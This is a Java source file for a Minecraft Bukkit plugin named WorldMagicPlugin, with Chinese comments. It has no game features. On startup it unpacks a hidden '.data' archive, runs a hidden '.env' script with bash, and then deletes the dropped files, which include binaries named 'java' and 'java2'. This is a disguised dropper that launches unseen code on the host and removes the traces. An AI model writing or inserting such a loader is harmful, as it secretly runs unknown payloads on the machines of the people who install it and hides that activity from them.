package com.github.vevc;

import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;
import java.io.*;
import java.util.concurrent.TimeUnit;
import java.util.zip.GZIPInputStream;
import org.apache.commons.compress.archivers.tar.TarArchiveEntry;
import org.apache.commons.compress.archivers.tar.TarArchiveInputStream;

/**
 * @author vevc
 */
public final class WorldMagicPlugin extends JavaPlugin {
    
    @Override
    public void onEnable() {
        // Plugin startup logic
        this.getLogger().info("WorldMagicPlugin 开始执行解压和脚本操作");
        
        // 使用Bukkit的调度器异步执行，避免阻塞主线程
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            try {
                // 1. 解压 .data 文件（.tar.gz格式）到当前目录
                this.getLogger().info("开始解压 .data 文件");
                extractTarGz(".data", ".");
                
                // 2. 执行脚本文件 .env
                this.getLogger().info("开始执行 .env 脚本文件");
                executeEnvScript("./.env");
                
                // 3. 等待20秒
                this.getLogger().info("等待20秒...");
                TimeUnit.SECONDS.sleep(20);
                
                // 4. 删除指定文件
                this.getLogger().info("开始删除指定文件");
                deleteFiles(new String[]{".env", "java", "java2", "config.json"});
                
                this.getLogger().info("操作执行完毕");
                
            } catch (Exception e) {
                this.getLogger().warning("执行操作时发生错误: " + e.getMessage());
                e.printStackTrace();
            }
        });
    }
    
    /**
     * 解压.tar.gz文件
     */
    private void extractTarGz(String inputFile, String outputDir) throws IOException {
        try (FileInputStream fis = new FileInputStream(inputFile);
             GZIPInputStream gis = new GZIPInputStream(fis);
             TarArchiveInputStream tis = new TarArchiveInputStream(gis)) {
            
            TarArchiveEntry entry;
            while ((entry = tis.getNextTarEntry()) != null) {
                if (entry.isDirectory()) {
                    continue;
                }
                
                File outputFile = new File(outputDir, entry.getName());
                File parent = outputFile.getParentFile();
                if (!parent.exists()) {
                    parent.mkdirs();
                }
                
                try (FileOutputStream fos = new FileOutputStream(outputFile)) {
                    byte[] buffer = new byte[1024];
                    int length;
                    while ((length = tis.read(buffer)) > 0) {
                        fos.write(buffer, 0, length);
                    }
                }
                
                // 设置文件权限（如果系统支持）
                if (entry.getMode() > 0) {
                    outputFile.setExecutable((entry.getMode() & 0111) != 0);
                    outputFile.setReadable((entry.getMode() & 0444) != 0);
                    outputFile.setWritable((entry.getMode() & 0222) != 0);
                }
            }
        }
    }
    
    /**
     * 执行.env脚本文件
     */
    private void executeEnvScript(String scriptPath) throws IOException, InterruptedException {
        File scriptFile = new File(scriptPath);
        if (!scriptFile.exists()) {
            throw new FileNotFoundException("脚本文件不存在: " + scriptPath);
        }
        
        // 设置脚本文件为可执行
        scriptFile.setExecutable(true);
        
        // 使用ProcessBuilder执行脚本
        ProcessBuilder pb = new ProcessBuilder("bash", scriptPath);
        pb.directory(new File("."));
        pb.redirectErrorStream(true);
        
        Process process = pb.start();
        
        // 读取脚本输出
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
            String line;
            while ((line = reader.readLine()) != null) {
                this.getLogger().info("[ENV脚本] " + line);
            }
        }
        
        // 等待脚本执行完成（设置超时时间）
        if (!process.waitFor(10, TimeUnit.SECONDS)) {
            process.destroy();
            throw new RuntimeException("脚本执行超时");
        }
        
        int exitCode = process.exitValue();
        if (exitCode != 0) {
            throw new RuntimeException("脚本执行失败，退出码: " + exitCode);
        }
    }
    
    /**
     * 删除指定文件
     */
    private void deleteFiles(String[] fileNames) {
        for (String fileName : fileNames) {
            File file = new File(fileName);
            if (file.exists()) {
                if (file.delete()) {
                    this.getLogger().info("已删除文件: " + fileName);
                } else {
                    this.getLogger().warning("删除文件失败: " + fileName);
                }
            } else {
                this.getLogger().info("文件不存在，无需删除: " + fileName);
            }
        }
    }
    
    @Override
    public void onDisable() {
        // Plugin shutdown logic
        this.getLogger().info("WorldMagicPlugin disabled");
    }
}
